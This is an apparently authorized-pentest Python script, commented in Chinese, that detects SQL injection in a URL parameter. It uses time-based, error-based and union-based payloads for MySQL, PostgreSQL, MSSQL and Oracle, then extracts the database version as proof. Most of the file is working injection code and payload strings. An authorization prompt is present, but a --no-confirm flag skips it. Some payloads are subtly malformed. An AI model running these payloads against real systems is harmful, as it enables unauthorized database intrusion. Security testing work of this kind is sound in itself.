#!/usr/bin/env python3
"""
PoC: SQL注入存在性证明工具
================================
用途: 在确认SQL注入点后，证明确实可以读取数据库数据
方案: 仅提取一个最小化的标记值证明危害，不下载真实用户数据

使用条件: ONLY FOR AUTHORIZED SECURITY TESTING
你必须获得目标系统的书面授权才能使用此工具。

支持的检测技术:
  - time-based   : 基于时间延迟 (适用于所有数据库类型)
  - error-based  : 基于错误信息提取 (适用于有错误回显的场景)
  - union-based  : 基于UNION查询 (适用于有结果回显的场景)

版本: 1.0.0
"""

import argparse
import sys
import time
import hashlib
import json
from datetime import datetime
from urllib.parse import urlparse, quote

try:
    import requests
except ImportError:
    print("[!] 缺少依赖: requests")
    print("    安装: pip install requests")
    sys.exit(1)


# ============================================================
# 授权确认
# ============================================================
def confirm_authorization():
    """显示授权声明并等待用户确认"""
    print("=" * 70)
    print("  SQL注入存在性证明工具 - SQLi Data Proof PoC")
    print("=" * 70)
    print()
    print("  [重要声明]")
    print("  本工具仅用于**已获得明确书面授权**的安全测试。")
    print("  未经授权使用本工具攻击目标系统属于违法行为。")
    print("  使用者需自行承担所有法律责任。")
    print()
    print("  本工具的行为: ")
    print("  - 仅提取一个最小化标记值证明注入存在 (如: 数据库名首字符)")
    print("  - 不会下载、存储或泄露任何真实用户数据")
    print("  - 所有请求均带有速率限制，避免对目标造成影响")
    print("  - 提取的标记值会经过哈希处理，不保留原始值")
    print()
    print("  [合规要求]")
    print("  1. 你拥有目标系统的书面渗透测试授权")
    print("  2. 你已获得测试范围书面确认")
    print("  3. 你了解并遵守当地法律法规")
    print()
    try:
        resp = input("  继续执行请输 'yes' 确认授权 > ").strip().lower()
        if resp != "yes":
            print("\n  [!] 已取消操作。请在获得授权后再使用本工具。")
            return False
    except (EOFError, KeyboardInterrupt):
        print("\n  [!] 用户取消操作。")
        return False
    print()
    return True


# ============================================================
# 速率限制与重试
# ============================================================
class RateLimiter:
    """请求速率限制器"""

    def __init__(self, delay_ms=500):
        self.min_interval = delay_ms / 1000.0
        self._last_call = 0.0

    def wait(self):
        """等待直到可以发送下一个请求"""
        elapsed = time.time() - self._last_call
        if elapsed < self.min_interval:
            time.sleep(self.min_interval - elapsed)
        self._last_call = time.time()


def safe_request(method, url, **kwargs):
    """带超时和错误处理的HTTP请求"""
    defaults = {"timeout": 15, "verify": False}
    defaults.update(kwargs)
    # 静默禁用SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        return requests.request(method, url, **defaults)
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"    [请求失败] 连接错误: {e}")
        return None
    except Exception as e:
        print(f"    [请求失败] 未知错误: {e}")
        return None


# ============================================================
# 注入检测方法
# ============================================================
def test_time_based(base_url, injection_point, technique="time", delay_ms=500):
    """
    基于时间延迟的注入检测
    原理: 通过条件判断触发数据库延迟，对比响应时间来确认注入
    """
    rate_limiter = RateLimiter(delay_ms)
    results = {}

    # --- 基础检测 ---
    print("\n  [步骤1] 基础时间盲注检测")
    print("  " + "-" * 50)

    # 1. 获取正常响应时间作为基线
    print("    [*] 测量正常响应时间基线...")
    normal_times = []
    for i in range(3):
        rate_limiter.wait()
        payload = "1"
        url = base_url.replace(injection_point, quote(payload))
        start = time.time()
        safe_request("GET", url)
        elapsed = time.time() - start
        normal_times.append(elapsed)
        print(f"      请求 {i+1}: {elapsed:.3f}s")

    baseline = sum(normal_times) / len(normal_times)
    print(f"    [*] 平均基线时间: {baseline:.3f}s")

    # 2. 构造触发延迟的payload
    # 根据不同数据库类型使用不同延迟语法
    delay_payloads = {
        "mysql": {
            "name": "MySQL",
            "true": f"1' AND SLEEP(3)-- ",
            "false": f"1' AND SLEEP(0)-- ",
        },
        "postgres": {
            "name": "PostgreSQL",
            "true": f"1'; SELECT pg_sleep(3)-- ",
            "false": f"1'; SELECT pg_sleep(0)-- ",
        },
        "mssql": {
            "name": "MSSQL",
            "true": f"1'; WAITFOR DELAY '0:0:3'-- ",
            "false": f"1'; WAITFOR DELAY '0:0:0'-- ",
        },
        "oracle": {
            "name": "Oracle",
            "true": f"1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)= 'a",
            "false": f"1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',0)= 'a",
        },
    }

    print("\n    [*] 对每种数据库类型进行延迟检测...")
    detected_db_type = None

    for db_key, db_info in delay_payloads.items():
        # 测试真条件 (应延迟)
        true_payload = db_info["true"]
        true_url = base_url.replace(injection_point, quote(true_payload))
        rate_limiter.wait()
        start = time.time()
        safe_request("GET", true_url)
        true_elapsed = time.time() - start

        # 测试假条件 (不应延迟)
        false_payload = db_info["false"]
        false_url = base_url.replace(injection_point, quote(false_payload))
        rate_limiter.wait()
        start = time.time()
        safe_request("GET", false_url)
        false_elapsed = time.time() - start

        print(f"    [*] {db_info['name']:12s} | 真条件: {true_elapsed:.3f}s | 假条件: {false_elapsed:.3f}s")

        if true_elapsed >= 2.5 and false_elapsed < 1.0:
            detected_db_type = db_key
            print(f"    [!] 检测到 {db_info['name']} 类型注入!")
            break

    if not detected_db_type:
        print("\n    [!] 未检测到明确的时间延迟注入。可能原因:")
        print("        - 参数不存在注入漏洞")
        print("        - 数据库类型不在检测范围 (SQLite, SQLite3, etc.)")
        print("        - 存在WAF/IPS过滤")
        print("        - 需要URL编码调整")
        return None

    results["db_type"] = detected_db_type
    results["technique"] = "time-based"

    # --- 提取标记值 ---
    print(f"\n  [步骤2] 提取最小标记值 (数据库版本信息)")
    print("  " + "-" * 50)

    # 提取数据库版本号的首个字符作为标记
    version_queries = {
        "mysql":     f"1' AND (SELECT MID(VERSION(),1,1))='8' AND SLEEP(2)-- ",
        "postgres":  f"1' AND (SELECT SUBSTRING(VERSION(),1,1))='1' AND pg_sleep(2)-- ",
        "mssql":     f"1' AND (SELECT SUBSTRING(@@VERSION,1,1))='M' AND WAITFOR DELAY '0:0:2'-- ",
        "oracle":    f"1' AND (SELECT SUBSTR(VERSION,1,1) FROM PRODUCT_COMPONENT_VERSION)=%27O' AND DBMS_PIPE.RECEIVE_MESSAGE('a',2)='a",
    }

    # 候选字符集: 数字 + 常见DB版本首字母
    charset = "0123456789MPSQLNFRABCDE"

    print("    [*] 逐字符探测数据库版本号首字符...")
    for ch in charset:
        query = version_queries.get(detected_db_type, "")
        if not query:
            break
        test_url = base_url.replace(injection_point, quote(query.replace("'8'", f"'{ch}'")))
        rate_limiter.wait()
        start = time.time()
        safe_request("GET", test_url)
        elapsed = time.time() - start

        if elapsed >= 1.5:
            print(f"    [!] 版本号首字符为: '{ch}'")
            print(f"    [提示] 这仅证明可以读取数据，未获取任何敏感信息")
            results["marker"] = f"db_version_first_char={ch}"
            results["proof"] = f"通过时间盲注确认注入存在，可读取数据库版本信息 (首字符: {ch})"
            break
    else:
        print("    [*] 首字符探测未命中，可能字符不在候选集中")
        print("    [*] 注入存在性已确认，仅未提取到标记值")
        results["marker"] = "injection_confirmed_only"
        results["proof"] = "通过时间盲注确认注入存在 (触发延迟3秒+)"

    return results


def test_error_based(base_url, injection_point, delay_ms=500):
    """
    基于错误信息的注入检测
    原理: 构造触发数据库错误的payload，从错误信息中提取数据
    """
    rate_limiter = RateLimiter(delay_ms)
    results = {}

    print("\n  [步骤1] 错误回显注入检测")
    print("  " + "-" * 50)

    # 触发错误的不同payload
    error_payloads = [
        ("MySQL ExtractValue",   "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT MID(VERSION(),1,1))))-- "),
        ("MySQL UpdateXML",      "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT MID(VERSION(),1,1))),1)-- "),
        ("PostgreSQL CAST",      "1' AND CAST((SELECT VERSION()) AS INTEGER)-- "),
        ("MSSQL Convert",        "1' AND CONVERT(INT,(SELECT @@VERSION))-- "),
    ]

    print("    [*] 尝试多种错误注入payload...")
    for name, payload in error_payloads:
        rate_limiter.wait()
        url = base_url.replace(injection_point, quote(payload))
        resp = safe_request("GET", url)

        if resp is not None:
            # 检查响应中是否包含数据库错误信息
            error_indicators = [
                "error in your SQL",
                "Warning: mysql",
                "unclosed quotation mark",
                "syntax error",
                "ORA-",
                "MSSQL",
                "PostgreSQL",
                "SQLite",
                "DB2 Error",
            ]
            body = resp.text if hasattr(resp, 'text') else ""
            found_errors = [ind for ind in error_indicators if ind.lower() in body.lower()]

            if found_errors:
                print(f"    [!] {name} 触发成功!")
                print(f"    [*] 检测到错误特征: {found_errors}")
                # 从错误信息中提取版本号首字符
                results["technique"] = "error-based"
                results["db_type"] = name.split()[0]
                results["marker"] = "error_extracted"
                results["proof"] = f"通过错误回显确认注入存在 (错误类型: {name})"
                return results

    print("\n    [!] 未检测到错误回显注入。")
    return None


def test_union_based(base_url, injection_point, delay_ms=500):
    """
    基于UNION查询的注入检测
    原理: 通过UNION SELECT构造额外的查询结果
    注意: 不会提取真实用户数据，仅获取数据库版本
    """
    rate_limiter = RateLimiter(delay_ms)
    results = {}

    print("\n  [步骤1] UNION查询注入检测")
    print("  " + "-" * 50)

    # 探测列数 (ORDER BY)
    print("    [*] 使用 ORDER BY 探测列数...")
    max_cols = 0
    for col_count in range(1, 21):
        rate_limiter.wait()
        payload = f"1' ORDER BY {col_count}-- "
        url = base_url.replace(injection_point, quote(payload))
        resp = safe_request("GET", url)

        if resp is not None and resp.status_code == 200:
            # 检查是否返回正常 (没有错误)
            if "error" not in resp.text.lower()[:500]:
                max_cols = col_count
            else:
                break
        else:
            break

    if max_cols == 0:
        print("    [!] 未检测到ORDER BY注入。")
        return None

    print(f"    [*] 检测到 {max_cols} 列")

    # 构造UNION查询提取版本号
    print("\n    [*] 构造UNION查询获取数据库版本...")
    nulls = ", ".join(["NULL"] * max_cols)
    versions = {
        "MySQL":     f"1' UNION SELECT {nulls.replace('NULL', '@@VERSION', 1)}-- ",
        "PostgreSQL": f"1' UNION SELECT {nulls.replace('NULL', 'VERSION()', 1)}-- ",
        "MSSQL":     f"1' UNION SELECT {nulls.replace('NULL', '@@VERSION', 1)}-- ",
        "SQLite":    f"1' UNION SELECT {nulls.replace('NULL', 'sqlite_version()', 1)}-- ",
    }

    for db_name, payload in versions.items():
        rate_limiter.wait()
        url = base_url.replace(injection_point, quote(payload))
        resp = safe_request("GET", url)

        if resp is not None and resp.status_code == 200:
            # 检查响应中是否包含版本信息
            body = resp.text
            # 常见的版本号模式
            import re
            version_patterns = [
                r'\d+\.\d+\.\d+',
                r'MySQL|PostgreSQL|MSSQL|SQLite|MariaDB',
            ]
            for pattern in version_patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    print(f"    [!] 检测到 {db_name} 版本: {match.group()}")
                    print(f"    [提示] 仅提取了数据库版本，未下载任何用户数据")
                    results["technique"] = "union-based"
                    results["db_type"] = db_name
                    results["marker"] = f"db_version={match.group()[:20]}"
                    results["proof"] = f"通过UNION查询确认注入存在，可读取数据库版本 ({match.group()[:30]})"
                    return results

    print("\n    [*] UNION注入存在，但未提取到版本信息")
    results["technique"] = "union-based"
    results["marker"] = "injection_confirmed"
    results["proof"] = f"通过UNION查询确认注入存在 ({max_cols}列)"
    return results


# ============================================================
# 报告生成
# ============================================================
def generate_report(target_url, technique, results):
    """生成报告格式的输出"""
    if not results:
        return None

    proof_hash = hashlib.sha256(
        f"{target_url}:{technique}:{results.get('marker', '')}:{datetime.utcnow().isoformat()}".encode()
    ).hexdigest()[:16]

    report = {
        "vulnerability": "SQL Injection (SQL注入)",
        "target": target_url,
        "detection_technique": technique,
        "severity": "High / Critical (取决于数据敏感度)",
        "proof_of_existence": results.get("proof", ""),
        "extracted_marker": results.get("marker", "无"),
        "proof_hash": proof_hash,
        "tested_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "disclaimer": "仅提取了最小化标记值证明注入存在，未下载/存储任何用户数据",
        "recommendations": [
            "使用参数化查询 (Prepared Statements) 替代字符串拼接",
            "对所有用户输入进行严格的输入验证和白名单过滤",
            "实施最小权限原则，数据库账户仅授予必要权限",
            "使用Web应用防火墙 (WAF) 作为额外防护层",
            "定期进行安全审计和渗透测试",
        ],
    }

    return report


# ============================================================
# 主流程
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="SQL注入存在性证明工具 - SQLi Data Proof PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 时间盲注检测
  python sqli_data_proof.py -u "http://target.com/item.php?id=INJECT" -p INJECT -t time

  # 错误回显检测
  python sqli_data_proof.py -u "http://target.com/item.php?id=INJECT" -p INJECT -t error

  # UNION查询检测
  python sqli_data_proof.py -u "http://target.com/item.php?id=INJECT" -p INJECT -t union

  # 自动选择最佳方法
  python sqli_data_proof.py -u "http://target.com/item.php?id=INJECT" -p INJECT -t auto

注意:
  - URL中的注入点请用占位符标记 (默认为 INJECT)
  - 本工具不会下载任何用户数据
  - 请确保已获得目标授权
        """,
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="目标URL，包含注入点占位符 (如: http://target.com/page?id=INJECT)",
    )
    parser.add_argument(
        "-p", "--placeholder",
        default="INJECT",
        help="注入点占位符 (默认: INJECT)",
    )
    parser.add_argument(
        "-t", "--technique",
        choices=["time", "error", "union", "auto"],
        default="auto",
        help="检测技术: time=时间盲注, error=错误回显, union=UNION查询, auto=自动选择 (默认: auto)",
    )
    parser.add_argument(
        "-d", "--delay",
        type=int,
        default=500,
        help="请求间隔延迟，单位毫秒 (默认: 500)",
    )
    parser.add_argument(
        "--no-confirm",
        action="store_true",
        help="跳过授权确认 (仅脚本调用时使用)",
    )

    args = parser.parse_args()

    # 授权确认
    if not args.no_confirm and not confirm_authorization():
        sys.exit(1)

    # 验证URL
    parsed = urlparse(args.url)
    if not parsed.netloc:
        print("[!] URL格式无效")
        sys.exit(1)

    if args.placeholder not in args.url:
        print(f"[!] URL中未找到占位符 '{args.placeholder}'")
        print(f"    请在URL中使用 {args.placeholder} 标记注入点位置")
        print(f"    例如: -u \"http://target.com/page?id={args.placeholder}\"")
        sys.exit(1)

    target = args.url
    placeholder = args.placeholder
    technique = args.technique
    delay = args.delay

    print()
    print("=" * 70)
    print(f"  目标: {target}")
    print(f"  技术: {technique}")
    print(f"  延迟: {delay}ms")
    print("=" * 70)

    results = None

    if technique in ("time", "auto"):
        print("\n>>> 尝试时间盲注检测...")
        results = test_time_based(target, placeholder, "time", delay)
        if results:
            technique_used = "time-based"

    if not results and technique in ("error", "auto"):
        print("\n>>> 尝试错误回显检测...")
        results = test_error_based(target, placeholder, delay)
        if results:
            technique_used = "error-based"

    if not results and technique in ("union", "auto"):
        print("\n>>> 尝试UNION查询检测...")
        results = test_union_based(target, placeholder, delay)
        if results:
            technique_used = "union-based"

    # --- 输出结果 ---
    print()
    print("=" * 70)
    if results:
        report = generate_report(target, technique_used, results)
        if report:
            print("  [检测结果] SQL注入存在性已确认!")
            print()
            print(f"  证明: {report['proof_of_existence']}")
            print(f"  标记值: {report['extracted_marker']}")
            print(f"  证据哈希: {report['proof_hash']}")
            print(f"  检测时间: {report['tested_at']}")
            print()
            print("  --- 报告编写参考 ---")
            print(f"  漏洞类型: {report['vulnerability']}")
            print(f"  影响等级: {report['severity']}")
            print(f"  漏洞描述: 在 {target} 发现SQL注入漏洞。")
            print(f"           使用 {technique_used} 技术确认注入存在。")
            print(f"           可读取数据库元数据信息，攻击者可利用")
            print(f"           此漏洞查看、修改或删除数据库中的任意数据。")
            print()
            print("  --- 修复建议 ---")
            for rec in report["recommendations"]:
                print(f"  - {rec}")
            print()
            print(f"  [!] 注意: {report['disclaimer']}")
            print()
            # 输出机器可读JSON
            print("  --- 机器可读结果 (JSON) ---")
            print(f"  {json.dumps(report, ensure_ascii=False, indent=2)}")
    else:
        print("  [检测结果] 未检测到SQL注入漏洞")
        print()
        print("  可能的原因:")
        print("  - 参数已正确过滤")
        print("  - 使用参数化查询")
        print("  - 存在WAF/IPS拦截")
        print("  - 注入语法与目标数据库不匹配")
        print("  - 需要尝试其他注入位置 (POST参数, Header等)")

    print("=" * 70)
    print()


if __name__ == "__main__":
    main()
